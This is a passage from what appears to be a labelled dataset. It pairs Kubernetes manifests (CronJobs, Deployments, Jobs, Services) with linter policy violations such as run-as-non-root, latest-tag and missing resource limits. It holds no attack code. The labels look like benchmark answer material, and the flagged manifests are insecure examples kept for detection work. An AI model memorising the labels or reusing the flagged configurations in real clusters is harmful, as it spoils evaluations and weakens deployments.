    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcactivities\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcactivities\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcactivities\n        containers:\n        - name: gcactivities\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - activities\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.120\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"gcactivities\" is not set to runAsNonRoot"
  },
  {
    "id": "9502",
    "manifest_path": "data/manifests/the_stack_sample/sample_3619.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcactivities\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcactivities\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcactivities\n        containers:\n        - name: gcactivities\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - activities\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.120\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"gcactivities\" has cpu request 0"
  },
  {
    "id": "9503",
    "manifest_path": "data/manifests/the_stack_sample/sample_3619.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcactivities\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcactivities\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcactivities\n        containers:\n        - name: gcactivities\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - activities\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.120\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"gcactivities\" has memory limit 0"
  },
  {
    "id": "9504",
    "manifest_path": "data/manifests/the_stack_sample/sample_3620.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: akschallengeacrayman.azurecr.io/captureorder\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: placeholder\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"captureorder\" is using an invalid container image, \"akschallengeacrayman.azurecr.io/captureorder\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9505",
    "manifest_path": "data/manifests/the_stack_sample/sample_3620.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: akschallengeacrayman.azurecr.io/captureorder\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: placeholder\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"captureorder\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "9506",
    "manifest_path": "data/manifests/the_stack_sample/sample_3620.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: akschallengeacrayman.azurecr.io/captureorder\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: placeholder\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9507",
    "manifest_path": "data/manifests/the_stack_sample/sample_3620.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: akschallengeacrayman.azurecr.io/captureorder\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: placeholder\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"captureorder\" does not have a read-only root file system"
  },
  {
    "id": "9508",
    "manifest_path": "data/manifests/the_stack_sample/sample_3620.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: akschallengeacrayman.azurecr.io/captureorder\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: placeholder\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"captureorder\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "9509",
    "manifest_path": "data/manifests/the_stack_sample/sample_3620.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: akschallengeacrayman.azurecr.io/captureorder\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: placeholder\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"captureorder\" is not set to runAsNonRoot"
  },
  {
    "id": "9510",
    "manifest_path": "data/manifests/the_stack_sample/sample_3621.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cloudefficiency-job\nspec:\n  template:\n    metadata:\n      name: cloudefficiency-pod\n    spec:\n      containers:\n      - name: cloudefficiency\n        image: $IMAGE\n        command:\n        - /usr/bin/time\n        args:\n        - -v\n        - ./upload.sh\n        workingDir: /app\n        env:\n        - name: DATA_BUCKET\n          value: $DATA_BUCKET\n        - name: BUCKET\n          value: $BUCKET\n        volumeMounts:\n        - name: config\n          mountPath: /app/report/config.json\n          subPath: config.json\n          readOnly: true\n        - name: config\n          mountPath: /app/frontend/src/config.js\n          subPath: config.js\n          readOnly: true\n        - name: aws-credentials\n          mountPath: /root/.aws/\n          readOnly: true\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n      volumes:\n      - name: config\n        secret:\n          secretName: cloudefficiency-config\n      - name: aws-credentials\n        secret:\n          secretName: cloudefficiency-aws-credentials\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "9511",
    "manifest_path": "data/manifests/the_stack_sample/sample_3621.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cloudefficiency-job\nspec:\n  template:\n    metadata:\n      name: cloudefficiency-pod\n    spec:\n      containers:\n      - name: cloudefficiency\n        image: $IMAGE\n        command:\n        - /usr/bin/time\n        args:\n        - -v\n        - ./upload.sh\n        workingDir: /app\n        env:\n        - name: DATA_BUCKET\n          value: $DATA_BUCKET\n        - name: BUCKET\n          value: $BUCKET\n        volumeMounts:\n        - name: config\n          mountPath: /app/report/config.json\n          subPath: config.json\n          readOnly: true\n        - name: config\n          mountPath: /app/frontend/src/config.js\n          subPath: config.js\n          readOnly: true\n        - name: aws-credentials\n          mountPath: /root/.aws/\n          readOnly: true\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n      volumes:\n      - name: config\n        secret:\n          secretName: cloudefficiency-config\n      - name: aws-credentials\n        secret:\n          secretName: cloudefficiency-aws-credentials\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cloudefficiency\" is using an invalid container image, \"$IMAGE\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9512",
    "manifest_path": "data/manifests/the_stack_sample/sample_3621.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cloudefficiency-job\nspec:\n  template:\n    metadata:\n      name: cloudefficiency-pod\n    spec:\n      containers:\n      - name: cloudefficiency\n        image: $IMAGE\n        command:\n        - /usr/bin/time\n        args:\n        - -v\n        - ./upload.sh\n        workingDir: /app\n        env:\n        - name: DATA_BUCKET\n          value: $DATA_BUCKET\n        - name: BUCKET\n          value: $BUCKET\n        volumeMounts:\n        - name: config\n          mountPath: /app/report/config.json\n          subPath: config.json\n          readOnly: true\n        - name: config\n          mountPath: /app/frontend/src/config.js\n          subPath: config.js\n          readOnly: true\n        - name: aws-credentials\n          mountPath: /root/.aws/\n          readOnly: true\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n      volumes:\n      - name: config\n        secret:\n          secretName: cloudefficiency-config\n      - name: aws-credentials\n        secret:\n          secretName: cloudefficiency-aws-credentials\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cloudefficiency\" does not have a read-only root file system"
  },
  {
    "id": "9513",
    "manifest_path": "data/manifests/the_stack_sample/sample_3621.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cloudefficiency-job\nspec:\n  template:\n    metadata:\n      name: cloudefficiency-pod\n    spec:\n      containers:\n      - name: cloudefficiency\n        image: $IMAGE\n        command:\n        - /usr/bin/time\n        args:\n        - -v\n        - ./upload.sh\n        workingDir: /app\n        env:\n        - name: DATA_BUCKET\n          value: $DATA_BUCKET\n        - name: BUCKET\n          value: $BUCKET\n        volumeMounts:\n        - name: config\n          mountPath: /app/report/config.json\n          subPath: config.json\n          readOnly: true\n        - name: config\n          mountPath: /app/frontend/src/config.js\n          subPath: config.js\n          readOnly: true\n        - name: aws-credentials\n          mountPath: /root/.aws/\n          readOnly: true\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n      volumes:\n      - name: config\n        secret:\n          secretName: cloudefficiency-config\n      - name: aws-credentials\n        secret:\n          secretName: cloudefficiency-aws-credentials\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cloudefficiency\" is not set to runAsNonRoot"
  },
  {
    "id": "9514",
    "manifest_path": "data/manifests/the_stack_sample/sample_3621.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cloudefficiency-job\nspec:\n  template:\n    metadata:\n      name: cloudefficiency-pod\n    spec:\n      containers:\n      - name: cloudefficiency\n        image: $IMAGE\n        command:\n        - /usr/bin/time\n        args:\n        - -v\n        - ./upload.sh\n        workingDir: /app\n        env:\n        - name: DATA_BUCKET\n          value: $DATA_BUCKET\n        - name: BUCKET\n          value: $BUCKET\n        volumeMounts:\n        - name: config\n          mountPath: /app/report/config.json\n          subPath: config.json\n          readOnly: true\n        - name: config\n          mountPath: /app/frontend/src/config.js\n          subPath: config.js\n          readOnly: true\n        - name: aws-credentials\n          mountPath: /root/.aws/\n          readOnly: true\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n      volumes:\n      - name: config\n        secret:\n          secretName: cloudefficiency-config\n      - name: aws-credentials\n        secret:\n          secretName: cloudefficiency-aws-credentials\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cloudefficiency\" has cpu request 0"
  },
  {
    "id": "9515",
    "manifest_path": "data/manifests/the_stack_sample/sample_3623.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cam-sim\n  labels:\n    app: cam-sim\nspec:\n  selector:\n    matchLabels:\n      app: cam-sim\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: cam-sim\n    spec:\n      containers:\n      - name: cam-sim\n        image: cam-sim:latest\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: cam-sim-conf\n        - configMapRef:\n            name: kafka-ca-cert\n        volumeMounts:\n        - name: kafka-ca-cert-volume\n          mountPath: /mnt/kafka-ca-cert\n      volumes:\n      - name: kafka-ca-cert-volume\n        configMap:\n          name: kafka-ca-cert\n          defaultMode: 420\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cam-sim\" is using an invalid container image, \"cam-sim:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9516",
    "manifest_path": "data/manifests/the_stack_sample/sample_3623.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cam-sim\n  labels:\n    app: cam-sim\nspec:\n  selector:\n    matchLabels:\n      app: cam-sim\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: cam-sim\n    spec:\n      containers:\n      - name: cam-sim\n        image: cam-sim:latest\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: cam-sim-conf\n        - configMapRef:\n            name: kafka-ca-cert\n        volumeMounts:\n        - name: kafka-ca-cert-volume\n          mountPath: /mnt/kafka-ca-cert\n      volumes:\n      - name: kafka-ca-cert-volume\n        configMap:\n          name: kafka-ca-cert\n          defaultMode: 420\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cam-sim\" does not have a read-only root file system"
  },
  {
    "id": "9517",
    "manifest_path": "data/manifests/the_stack_sample/sample_3623.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cam-sim\n  labels:\n    app: cam-sim\nspec:\n  selector:\n    matchLabels:\n      app: cam-sim\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: cam-sim\n    spec:\n      containers:\n      - name: cam-sim\n        image: cam-sim:latest\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: cam-sim-conf\n        - configMapRef:\n            name: kafka-ca-cert\n        volumeMounts:\n        - name: kafka-ca-cert-volume\n          mountPath: /mnt/kafka-ca-cert\n      volumes:\n      - name: kafka-ca-cert-volume\n        configMap:\n          name: kafka-ca-cert\n          defaultMode: 420\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cam-sim\" is not set to runAsNonRoot"
  },
  {
    "id": "9518",
    "manifest_path": "data/manifests/the_stack_sample/sample_3623.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cam-sim\n  labels:\n    app: cam-sim\nspec:\n  selector:\n    matchLabels:\n      app: cam-sim\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: cam-sim\n    spec:\n      containers:\n      - name: cam-sim\n        image: cam-sim:latest\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: cam-sim-conf\n        - configMapRef:\n            name: kafka-ca-cert\n        volumeMounts:\n        - name: kafka-ca-cert-volume\n          mountPath: /mnt/kafka-ca-cert\n      volumes:\n      - name: kafka-ca-cert-volume\n        configMap:\n          name: kafka-ca-cert\n          defaultMode: 420\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cam-sim\" has cpu request 0"
  },
  {
    "id": "9519",
    "manifest_path": "data/manifests/the_stack_sample/sample_3623.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cam-sim\n  labels:\n    app: cam-sim\nspec:\n  selector:\n    matchLabels:\n      app: cam-sim\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: cam-sim\n    spec:\n      containers:\n      - name: cam-sim\n        image: cam-sim:latest\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: cam-sim-conf\n        - configMapRef:\n            name: kafka-ca-cert\n        volumeMounts:\n        - name: kafka-ca-cert-volume\n          mountPath: /mnt/kafka-ca-cert\n      volumes:\n      - name: kafka-ca-cert-volume\n        configMap:\n          name: kafka-ca-cert\n          defaultMode: 420\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cam-sim\" has memory limit 0"
  },
  {
    "id": "9520",
    "manifest_path": "data/manifests/the_stack_sample/sample_3624.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: instance-index-env-injector\n  namespace: eirini-core\nspec:\n  selector:\n    matchLabels:\n      name: instance-index-env-injector\n  template:\n    metadata:\n      labels:\n        name: instance-index-env-injector\n      annotations:\n        sidecar.istio.io/inject: 'false'\n    spec:\n      serviceAccountName: eirini-instance-index-env-injector\n      volumes:\n      - name: config-map-volume\n        configMap:\n          name: instance-index-env-injector\n          items:\n          - key: instance-index-env-injector.yml\n            path: instance-index-env-injector.yml\n      securityContext:\n        runAsNonRoot: true\n      containers:\n      - name: instance-index-env-injector\n        image: eirini/instance-index-env-injector@sha256:e57a0c1461ba8f28ec1ea7bef892cde0011593dd142f0f0049f26c8473aaa9a5\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: config-map-volume\n          mountPath: /etc/eirini/config\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          requests:\n            cpu: 20m\n            memory: 20Mi\n          limits:\n            cpu: 100m\n            memory: 100Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"instance-index-env-injector\" does not have a read-only root file system"
  },
  {
    "id": "9521",
    "manifest_path": "data/manifests/the_stack_sample/sample_3624.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: instance-index-env-injector\n  namespace: eirini-core\nspec:\n  selector:\n    matchLabels:\n      name: instance-index-env-injector\n  template:\n    metadata:\n      labels:\n        name: instance-index-env-injector\n      annotations:\n        sidecar.istio.io/inject: 'false'\n    spec:\n      serviceAccountName: eirini-instance-index-env-injector\n      volumes:\n      - name: config-map-volume\n        configMap:\n          name: instance-index-env-injector\n          items:\n          - key: instance-index-env-injector.yml\n            path: instance-index-env-injector.yml\n      securityContext:\n        runAsNonRoot: true\n      containers:\n      - name: instance-index-env-injector\n        image: eirini/instance-index-env-injector@sha256:e57a0c1461ba8f28ec1ea7bef892cde0011593dd142f0f0049f26c8473aaa9a5\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: config-map-volume\n          mountPath: /etc/eirini/config\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          requests:\n            cpu: 20m\n            memory: 20Mi\n          limits:\n            cpu: 100m\n            memory: 100Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"eirini-instance-index-env-injector\" not found"
  },
  {
    "id": "9522",
    "manifest_path": "data/manifests/the_stack_sample/sample_3626.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: frontend\n        image: academind/kub-demo-frontend:latest\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"frontend\" is using an invalid container image, \"academind/kub-demo-frontend:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9523",
    "manifest_path": "data/manifests/the_stack_sample/sample_3626.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: frontend\n        image: academind/kub-demo-frontend:latest\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"frontend\" does not have a read-only root file system"
  },
  {
    "id": "9524",
    "manifest_path": "data/manifests/the_stack_sample/sample_3626.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: frontend\n        image: academind/kub-demo-frontend:latest\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"frontend\" is not set to runAsNonRoot"
  },
  {
    "id": "9525",
    "manifest_path": "data/manifests/the_stack_sample/sample_3626.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: frontend\n        image: academind/kub-demo-frontend:latest\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"frontend\" has cpu request 0"
  },
  {
    "id": "9526",
    "manifest_path": "data/manifests/the_stack_sample/sample_3626.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: frontend\n        image: academind/kub-demo-frontend:latest\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"frontend\" has memory limit 0"
  },
  {
    "id": "9527",
    "manifest_path": "data/manifests/the_stack_sample/sample_3627.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mongo\n  labels:\n    name: mongo\nspec:\n  ports:\n  - port: 27017\n    targetPort: 27017\n  clusterIP: None\n  selector:\n    role: mongo\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[role:mongo])"
  },
  {
    "id": "9528",
    "manifest_path": "data/manifests/the_stack_sample/sample_3630.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: kube-state-metrics\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        kubectl.kubernetes.io/default-container: kube-state-metrics\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        - --metric-denylist=kube_secret_labels\n        - --metric-labels-allowlist=pods=[*],node=[*]\n        - '--metric-denylist=\n\n          kube_.+_created,\n\n          kube_.+_metadata_resource_version,\n\n          kube_replicaset_metadata_generation,\n\n          kube_replicaset_status_observed_generation,\n\n          kube_pod_restart_policy,\n\n          kube_pod_init_container_status_terminated,\n\n          kube_pod_init_container_status_running,\n\n          kube_pod_container_status_terminated,\n\n          kube_pod_container_status_running,\n\n          kube_pod_completion_time,\n\n          kube_pod_status_scheduled\n\n          '\n        image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0\n        name: kube-state-metrics\n        resources:\n          requests:\n            cpu: 2m\n            memory: 80Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /tmp\n          name: volume-directive-shadow\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        